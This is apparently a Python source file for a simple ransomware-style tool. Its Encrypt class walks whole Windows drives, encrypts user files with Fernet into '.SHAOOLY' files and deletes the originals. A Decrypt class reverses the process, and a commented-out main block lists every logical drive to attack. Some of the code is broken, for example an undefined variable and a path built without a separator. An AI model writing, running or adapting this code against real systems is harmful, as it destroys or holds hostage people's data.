from cryptography.fernet import Fernet
import os
import threading
from win32 import win32api
import time


class Encrypt(threading.Thread):
    global fernet
    def __init__(self, drive):
        self.drive = drive

    def run(self):
        global fernet
        start = time.perf_counter()
        for r, d, f in os.walk(self.drive):
            if r.split("\\")[1] not in ["Windows", "Program Files", "Program Files (x86)", "PerfLogs"]:
                for file in f:
                    if file.split(".")[-1] not in ["iso", "exe", "dll"]:
                        filepath = os.path.join(r, file)
                        if len(file.split('.')) == 1:
                            file_extension = ""
                        else:
                            file_extension = file.split(".")[-1]
                        file_name = file.split(".")[0]
                        enc_file_name = f'{r}/{file_name}.SHAOOLY'
                        byte_file = open(filepath, 'rb')
                        enc_file_content = fernet.encrypt(byte_file.read())
                        enc_file_name = f'{r}{file_name}{i}.SHAOOLY'
                        encrypted_file = open(enc_file_name, 'x')
                        encrypted_file.write(file_extension + '\n' + enc_file_content.decode())
                        byte_file.close()
                        os.remove(filepath)
        end = time.perf_counter()
        print(end - start)


class Decrypt(threading.Thread):
    def __init__(self, drive):
        self.drive = drive

    def run(self):
        global fernet
        for r, d, f in os.walk(self.drive):
            for file in f:
                filepath = os.path.join(r, file)
                filename = filepath.split('/')[-1].split(".")[0]
                if filepath.split('/')[-1].split(".")[-1] == "SHAOOLY":
                    enc_file = open(filepath, 'r')
                    file_content = enc_file.read().split('\n')
                    ext = file_content[0]
                    file_name_with_ext = f'{filename}.{ext}'
                    dec_file = open(file_name_with_ext, 'wb')
                    dec_file.write(fernet.decrypt(file_content[1].encode()))
                    enc_file.close()
                    os.remove(filepath)


#if __name__ == "__main__":
#    key = open("key.txt", 'rb').read()
#    fernet = Fernet(key)
#    drives = win32api.GetLogicalDriveStrings()
#    drives = drives.split('\000')[:-1]
#    for drive in drives:
#        pass
#        # Encrypt(drive).run()
# encrypt = Encrypt(r"C:\Users\shaoo\Desktop\lidan")
# encrypt.run()
# dec = Decrypt(r"C:\Users\shaoo\Desktop\lidan")
# dec.run()
